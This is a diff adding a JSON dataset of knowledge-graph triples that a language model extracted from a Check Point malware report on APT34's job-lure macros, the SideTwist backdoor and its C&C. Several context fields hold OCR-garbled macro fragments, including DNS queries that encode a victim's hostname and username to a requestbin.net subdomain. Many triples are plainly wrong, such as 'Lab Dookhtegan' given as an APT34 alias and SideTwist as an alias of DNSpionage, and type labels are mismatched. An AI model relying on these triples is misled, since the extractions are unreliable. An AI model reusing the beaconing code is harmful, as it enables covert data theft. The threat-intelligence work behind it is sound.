@@ -1,0 +1,933 @@
+{
+  "metrics": {
+    "file_name": "Iran’s APT34 Returns with an Updated Arsenal - Check Point Research.pdf",
+    "model_used": "gemma2:9b",
+    "doc_sha256_id": "172b59bdab12d5e3",
+    "num_pages": 7,
+    "num_sentences_total": 91,
+    "num_sentences_used": 56,
+    "num_raw_triples": 56,
+    "num_valid_triples": 38,
+    "num_suspicious_triples": 18,
+    "avg_triples_per_sentence": 1.0,
+    "rejection_stats": {
+      "bad_structure": 0,
+      "invalid_class_or_predicate": 18
+    },
+    "runtime_seconds": 189.07381415367126
+  },
+  "data": [
+    {
+      "context": "Since the 2019 leak of APT34's tools by an entity named 'Lab Dookhtegan', the threat group has been actively retooling and updating their payload arsenal to try and avoid detection, creating several different malware variants whose ultimate purpose remained the same: to gain the initial foothold on the targeted device.",
+      "triple": [
+        {
+          "subject": {
+            "name": "APT34",
+            "type": "ThreatActor"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "'Lab Dookhtegan'",
+            "type": "Organization"
+          },
+          "evidence": {
+            "quote": "Since the 2019 leak of APT34's tools by an entity named 'Lab Dookhtegan'"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 1,
+        "id": "002",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Starting with the DNSpionage campaign back in 2018, APT34 has been observed targeting individuals through the use of booby-trapped job opportunity documents, delivered directly to the selected targets via LinkedIn messages.",
+      "triple": [
+        {
+          "subject": {
+            "name": "APT34",
+            "type": "ThreatActor"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "individuals",
+            "type": "Person"
+          },
+          "evidence": {
+            "quote": "has been observed targeting individuals"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 1,
+        "id": "003",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "This activity continued through 2019 with the HardPass operation, in which the LinkedIn platform was used in the same manner.",
+      "triple": [
+        {
+          "subject": {
+            "name": "HardPass operation",
+            "type": "Campaign"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "LinkedIn platform",
+            "type": "DomainName"
+          },
+          "evidence": {
+            "quote": "in which the LinkedIn platform was used"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 1,
+        "id": "004",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "In this latest campaign from January, a document submitted to VirusTotal from Lebanon (a common target for APT34), also depicts such a job opportunity document, although in this case we were unable to confirm the initial delivery mechanism to the target.",
+      "triple": [
+        {
+          "subject": {
+            "name": "document",
+            "type": "Filepath"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "target",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "also depicts such a job opportunity document, although in this case we were unable to confirm the initial delivery mechanism to the target"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 1,
+        "id": "005",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Our analysis began with a malicious Microsoft Word document named Job-Details.doc (md5: 6615c410b8d7411ed14946635947325e ).",
+      "triple": [
+        {
+          "subject": {
+            "name": "Job-Details.doc",
+            "type": "Filename"
+          },
+          "predicate": "has",
+          "object": {
+            "name": "md5: 6615c410b8d7411ed14946635947325e",
+            "type": "MD5"
+          },
+          "evidence": {
+            "quote": "md5: 6615c410b8d7411ed14946635947325e"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 1,
+        "id": "008",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "However char BENEFITS Emolove monthl month Kunaitend The decoy document clearly tries to appear like a benign document, offering various positions in the Ntiva IT consulting company - a company based in Virginia, US.",
+      "triple": [
+        {
+          "subject": {
+            "name": "decoy document",
+            "type": "Malware"
+          },
+          "predicate": "indicates",
+          "object": {
+            "name": "benign document",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "The decoy document clearly tries to appear like a benign document"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 2,
+        "id": "002",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "However, once the user activates the embedded malicious macros, the full infection flow is triggered: Fig 2: Infection Flow Registers a Scheduled Task WW Executes every 5 mins requestbin net Drops DOC EXE Jobs-Details doc SystemFailureReporter exe C&C Checks if exists sarmsoftware com Drops XML Update xml Malicious Macros with DNS tunneling Macros used by APT34's job opportunity campaigns have evolved through the years, but also managed to keep their own distinctive style and purpose: Verification that there is a mouse connected to the PC (Anti-Sandboxing technique).",
+      "triple": [
+        {
+          "subject": {
+            "name": "Malicious Macros",
+            "type": "Malware"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "PC",
+            "type": "Hardware"
+          },
+          "evidence": {
+            "quote": "Verification that there is a mouse connected to the PC (Anti-Sandboxing technique)."
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 2,
+        "id": "003",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Dropping embedded executable to disk with a 'doc' extension (later to be renamed to '.exe').",
+      "triple": [
+        {
+          "subject": {
+            "name": "Dropper",
+            "type": "Dropper"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "'doc'",
+            "type": "Filename"
+          },
+          "evidence": {
+            "quote": "with a 'doc' extension"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 2,
+        "id": "005",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "APT34 is notorious for its heavy use of DNS tunneling through many of their different tools, and this time this feature also made its way into the initial macros stage.",
+      "triple": [
+        {
+          "subject": {
+            "name": "APT34",
+            "type": "ThreatActor"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "DNS tunneling",
+            "type": "AttackPattern_SmallDescription"
+          },
+          "evidence": {
+            "quote": "its heavy use of DNS tunneling"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 3,
+        "id": "001",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Once the macros are executed, DNS requests are used to beacon back to the attacker, and inform them of the current stage of the execution, as well as to deliver some victim identifiable information.",
+      "triple": [
+        {
+          "subject": {
+            "name": "Macros",
+            "type": "Application"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "DNS requests",
+            "type": "Protocol"
+          },
+          "evidence": {
+            "quote": "Once the macros are executed, DNS requests are used to beacon back"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 3,
+        "id": "002",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Fig 4: Snippet from the malicious macros, responsible for sending DNS queries In this step, the attacker is using the publicly available requestbin.net DNS tunneling service, in order to get updates about the macros infection progress.",
+      "triple": [
+        {
+          "subject": {
+            "name": "attacker",
+            "type": "Person"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "requestbin.net",
+            "type": "DomainName"
+          },
+          "evidence": {
+            "quote": "using the publicly available requestbin.net DNS tunneling service"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 3,
+        "id": "003",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "This way the attacker-owned infrastructure would not be exposed, in case a sandbox would not be able to fully 'detonate' the document.",
+      "triple": [
+        {
+          "subject": {
+            "name": "attacker-owned infrastructure",
+            "type": "Infrastructure"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "sandbox",
+            "type": "System"
+          },
+          "evidence": {
+            "quote": "This way the attacker-owned infrastructure would not be exposed, in case a sandbox would not be able to fully 'detonate' the document."
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 3,
+        "id": "004",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Below is a demonstration of the information the attacker would see on the requesbin.net website, when a victim executes the malicious macros from a system with the following environment: User name: John Hostname: John-pc Fig 5: The macro requests as viewed on 'requesbin.net', with source IP address and timestamp redacted The encoded data is derived from the PC information, in the following manner:",
+      "triple": [
+        {
+          "subject": {
+            "name": "macro",
+            "type": "Malware"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "system",
+            "type": "System"
+          },
+          "evidence": {
+            "quote": "The macro requests as viewed on 'requesbin.net', with source IP address and timestamp redacted The encoded data is derived from the PC information, in the following manner:"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 3,
+        "id": "005",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Fig 6: encoded DNS data Sub Document_Open() Randomize hostname LCase(Environ( computername\" ) ) hostname Mid(hostname, Len(hostname) 3 , username Mid(LCase(Environ( username\" ) )",
+      "triple": [
+        {
+          "subject": {
+            "name": "Fig 6",
+            "type": "Unknown"
+          },
+          "predicate": "has",
+          "object": {
+            "name": "encoded DNS data",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "encoded DNS data"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 3,
+        "id": "006",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": ", 1, 3) domain 37dcafe55be52ac33366.d.requestbin.net Call DnsQuery (myDomain(1) , DNS_TYPE_A, 0, 0 0, 0) Function myDomain(n",
+      "triple": [
+        {
+          "subject": {
+            "name": "domain",
+            "type": "DomainName"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "37dcafe55be52ac33366.d.requestbin.net",
+            "type": "DomainName"
+          },
+          "evidence": {
+            "quote": "domain 37dcafe55be52ac33366.d.requestbin.net"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 3,
+        "id": "007",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "As String myDomain hostname username & RandString(3) & n & domain End Function Received data TIME:",
+      "triple": [
+        {
+          "subject": {
+            "name": "myDomain",
+            "type": "DomainName"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "hostname username & RandString(3) & n & domain",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "hostname username & RandString(3) & n & domain"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 3,
+        "id": "009",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "3/30/2021 FROM: DATA TIME: 3/30/2021 , FROM: DATA n-pcjohht12 n-pcjoh51m1 John-PC John Random Macro stage",
+      "triple": [
+        {
+          "subject": {
+            "name": "n-pcjohht12",
+            "type": "DomainName"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "John-PC",
+            "type": "OperatingSystem"
+          },
+          "evidence": {
+            "quote": "n-pcjohht12 n-pcjoh51m1 John-PC"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 3,
+        "id": "010",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": " Second Stage Payload: SideTwist The backdoor in this stage, is a variant we haven't seen before in previous APT34 operations, but provides functionality which is simple and similar to other C based backdoors utilized by the group: DNSpionage and TONEDEAF and TONEDEAF2.0.",
+      "triple": [
+        {
+          "subject": {
+            "name": "Second Stage Payload: SideTwist",
+            "type": "Malware"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "DNSpionage",
+            "type": "Backdoor"
+          },
+          "evidence": {
+            "quote": "but provides functionality which is simple and similar to other C based backdoors utilized by the group: DNSpionage and TONEDEAF and TONEDEAF2.0."
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 4,
+        "id": "000",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "GetComputerNaneExW(ComputerNaneDnsDomain, dnsnane &len return 0; if len memcpy dnsnane OxC8u , \"WORKGROUP\" Ox14u) ; Fig 8: Code to gather identifiable information Next the malware will verify that the update.xml file that was supposed to be created in the 1 st stage of the infection does indeed exists, and if not, it will terminate itself - printing the following text to the debugging output using the OutputDebugString function: 'Please install visual studio 2017 and try again' if Jupdate OutputDebugStringV(L\"Please install visual studio 2017 and try again\" ) ; return Fig 9: Code to verify that the 1st stage was executed As the purpose of this function is to print debugging information, only during the debugging process of an application, the text will not be visible to the regular user.",
+      "triple": [
+        {
+          "subject": {
+            "name": "GetComputerNameExW",
+            "type": "Application"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "ComputerNaneDnsDomain",
+            "type": "DomainName"
+          },
+          "evidence": {
+            "quote": "GetComputerNameExW(ComputerNaneDnsDomain, dnsnane &len return 0;"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 4,
+        "id": "015",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "C&C communication The backdoor's communication with the C&C server ( sarmsoftware[.]com ) is HTTP based on port 443 with port 80 as fallback.",
+      "triple": [
+        {
+          "subject": {
+            "name": "backdoor",
+            "type": "Backdoor"
+          },
+          "predicate": "communicatesWith",
+          "object": {
+            "name": "sarmsoftware[.]com",
+            "type": "DomainName"
+          },
+          "evidence": {
+            "quote": "The backdoor's communication with the C&C server ( sarmsoftware[.]com )"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 4,
+        "id": "016",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": " The backdoor uses two different techniques for its outgoing and incoming communications with the C&C server, though in both cases the same encryption algorithm is utilized (see more on encryption below).",
+      "triple": [
+        {
+          "subject": {
+            "name": "backdoor",
+            "type": "Backdoor"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "two different techniques",
+            "type": "AttackPattern_SmallDescription"
+          },
+          "evidence": {
+            "quote": "The backdoor uses two different techniques"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 5,
+        "id": "000",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Command Request Communication The backdoor contacts the C&C server in the following URL using a GET request: sarmsoftware[.]com/search/{identifier} The response to this request is hidden in the source code of following Flickr lookalike page: 9 Not secure sarmsoftware com /search/",
+      "triple": [
+        {
+          "subject": {
+            "name": "backdoor",
+            "type": "Backdoor"
+          },
+          "predicate": "communicatesWith",
+          "object": {
+            "name": "C&C server",
+            "type": "CommandAndControl"
+          },
+          "evidence": {
+            "quote": "The backdoor contacts the C&C server"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 5,
+        "id": "001",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "[flickr Fig 10: Fake Flickr lookalike page used as C&C The response is returned to the backdoor within the HTML code, in the following format: /*Encrypted_Message_Encoded_with_Base64*/",
+      "triple": [
+        {
+          "subject": {
+            "name": "backdoor",
+            "type": "Backdoor"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "HTML code",
+            "type": "Filepath"
+          },
+          "evidence": {
+            "quote": "The response is returned to the backdoor within the HTML code"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 5,
+        "id": "002",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "<div class=\"view photo-list-view requirecToSh <div class=\"view photo-list-photo-view required <div class= 'interaction-view\"></div> classs\"view photo-list-photo-view required <div class= class= view photo-list-photo-view required <div class= interaction-Vieu ></div> class= view photo-list-photo-view required Fig 11: C&C commands embedded within the code After this base64 string is decoded and decrypted , the plain-text content is in the following pipe-separated format: Command Number Command ID Base64(Arg 1|Arg2)",
+      "triple": [
+        {
+          "subject": {
+            "name": "Command Number",
+            "type": "AttackPattern_SmallDescription"
+          },
+          "predicate": "has",
+          "object": {
+            "name": "Command ID",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "Command Number Command ID"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 5,
+        "id": "003",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Fig 12: Encrypted data format Command Number - a running index number to keep track of executed commands.",
+      "triple": [
+        {
+          "subject": {
+            "name": "Command Number",
+            "type": "Unknown"
+          },
+          "predicate": "has",
+          "object": {
+            "name": "running index number",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "a running index number to keep track of executed commands."
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 5,
+        "id": "004",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "104 - Shell Command (duplicate): execute the Shell command attached in the {Arg1} argument.",
+      "triple": [
+        {
+          "subject": {
+            "name": "Shell",
+            "type": "Application"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "Shell command",
+            "type": "CommandAndControl"
+          },
+          "evidence": {
+            "quote": "execute the Shell command attached in the {Arg1} argument."
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 5,
+        "id": "010",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Command Results Communication After the backdoor has executed an arbitrary command on the victim's machine, it returns the result of the executed command to the C&C server, to the same URL as before, but in a POST request instead of a GET: sarmsoftware[.]com/search/{identifier} -1 , the",
+      "triple": [
+        {
+          "subject": {
+            "name": "backdoor",
+            "type": "Backdoor"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "sarmsoftware[.]com/search/{identifier} -1",
+            "type": "DomainName"
+          },
+          "evidence": {
+            "quote": "has executed an arbitrary command on the victim's machine, it returns the result of the executed command to the C&C server, to the same URL as before, but in a POST request instead of a GET: sarmsoftware[.]com/search/{identifier} -1 , the"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 5,
+        "id": "011",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": " The format of the POST body is a simple JSON, based on the command number provided from the C&C server and the encrypted result of the command execution: (command Encrypted Command Result Number Fig 13: Result data format Communication Encryption",
+      "triple": [
+        {
+          "subject": {
+            "name": "POST body",
+            "type": "Unknown"
+          },
+          "predicate": "has",
+          "object": {
+            "name": "simple JSON",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "The format of the POST body is a simple JSON"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 6,
+        "id": "000",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The same variable name beacher was present in and old DNSpionage campaign: Public Function writeToFile (path As String_ data)",
+      "triple": [
+        {
+          "subject": {
+            "name": "beacher",
+            "type": "Unknown"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "DNSpionage campaign",
+            "type": "Campaign"
+          },
+          "evidence": {
+            "quote": "The same variable name beacher was present in and old DNSpionage campaign"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 6,
+        "id": "010",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "As Integer fileNo FreeFile fn FreeFile Open winner add For Binary Lock Read Write As {fileno Open path For Binary Lock Read Write As #fn Din beacher () Byte beacherl peacher Din beacher () As Byte beacher beacher data close #fileno Put fn , beacher Close #fn End",
+      "triple": [
+        {
+          "subject": {
+            "name": "beacher",
+            "type": "Filename"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "data",
+            "type": "Filepath"
+          },
+          "evidence": {
+            "quote": "beacherl peacher Din beacher () As Byte beacher beacher data"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 6,
+        "id": "013",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "If End Function Original DNSpionage New Campaign Campaign eno , Fig 14: Similar variable name in old macros code The main functionality of the macros remained the same as in a previous APT34 campaign: The malicious macros use the MouseAvailable function for evasion, and create a scheduled task to execute a payload embedded within the document.",
+      "triple": [
+        {
+          "subject": {
+            "name": "malicious macros",
+            "type": "Malware"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "MouseAvailable function",
+            "type": "AttackPattern_SmallDescription"
+          },
+          "evidence": {
+            "quote": "The malicious macros use the MouseAvailable function for evasion,"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 6,
+        "id": "014",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "C&C Communication Similarity APT34's backdoors DNSpionage and TONEDEAF are known to receive commands from the servers by searching for specific pattern hidden inside the HTML content of a legitimate looking website.",
+      "triple": [
+        {
+          "subject": {
+            "name": "APT34",
+            "type": "ThreatActor"
+          },
+          "predicate": "has",
+          "object": {
+            "name": "backdoors",
+            "type": "Backdoor"
+          },
+          "evidence": {
+            "quote": "APT34's backdoors"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 6,
+        "id": "015",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "While analyzing the above campaign, this and additional APT34 related documents were uploaded to VirusTotal and noted by malware",
+      "triple": [
+        {
+          "subject": {
+            "name": "campaign",
+            "type": "Campaign"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "VirusTotal",
+            "type": "DomainName"
+          },
+          "evidence": {
+            "quote": "uploaded to VirusTotal"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 6,
+        "id": "018",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "These documents utilized the very same requestbin.net DNS tunneling service in the initial macros and delivered another of the group's signature tools: a variant of the .NET based backdoor named Karkoff, which utilized internet facing exchange servers as a communication method with the attackers.",
+      "triple": [
+        {
+          "subject": {
+            "name": "documents",
+            "type": "MalwareAnalysis"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "requestbin.net DNS tunneling service",
+            "type": "DomainName"
+          },
+          "evidence": {
+            "quote": "These documents utilized the very same requestbin.net DNS tunneling service"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 7,
+        "id": "001",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The newly found artifacts emphasize the extent of the ongoing APT34's offensive operations against targets in the Middle East, and especially in Lebanon: The Karkoff implant (MD5: ab25014c3d6f77ec5880c8f9728be968) included credentials for an exchange server belonging to the Lebanese Government ( mail.army.gov[.]lb ), which might be an indication of a long running compromise of their network.",
+      "triple": [
+        {
+          "subject": {
+            "name": "Karkoff implant",
+            "type": "Malware"
+          },
+          "predicate": "has",
+          "object": {
+            "name": "credentials for an exchange server",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "The Karkoff implant (MD5: ab25014c3d6f77ec5880c8f9728be968) included credentials for an exchange server"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 7,
+        "id": "002",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Conclusion Iran backed APT34 shows no sign of slowing down, further pushing its political agenda in the middle-east, with an ongoing focus on Lebanon - using offensive cyber operations.",
+      "triple": [
+        {
+          "subject": {
+            "name": "APT34",
+            "type": "ThreatActor"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "offensive cyber operations",
+            "type": "AttackPattern_SmallDescription"
+          },
+          "evidence": {
+            "quote": "using offensive cyber operations"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 7,
+        "id": "003",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "In this publication we analyzed the newest backdoor variant deployed by the group's ongoing job opportunities campaigns, which includes malicious documents with job offers - a technique they have successfully employed since at least 2018.",
+      "triple": [
+        {
+          "subject": {
+            "name": "backdoor variant",
+            "type": "Backdoor"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "newest backdoor variant",
+            "type": "Backdoor"
+          },
+          "evidence": {
+            "quote": "newest backdoor variant deployed by the group's ongoing job opportunities campaigns"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 7,
+        "id": "005",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Appendix A: Indicators of Compromise Malicious document: MD5: 6615c410b8d7411ed14946635947325e SHA1: 9bba72ac66af84253b55dd7789afc90e0344bf25",
+      "triple": [
+        {
+          "subject": {
+            "name": "Malicious document",
+            "type": "Malware"
+          },
+          "predicate": "has",
+          "object": {
+            "name": "MD5: 6615c410b8d7411ed14946635947325e",
+            "type": "MD5"
+          },
+          "evidence": {
+            "quote": "MD5: 6615c410b8d7411ed14946635947325e"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 7,
+        "id": "007",
+        "source": "TEXT"
+      }
+    }
+  ]
+}
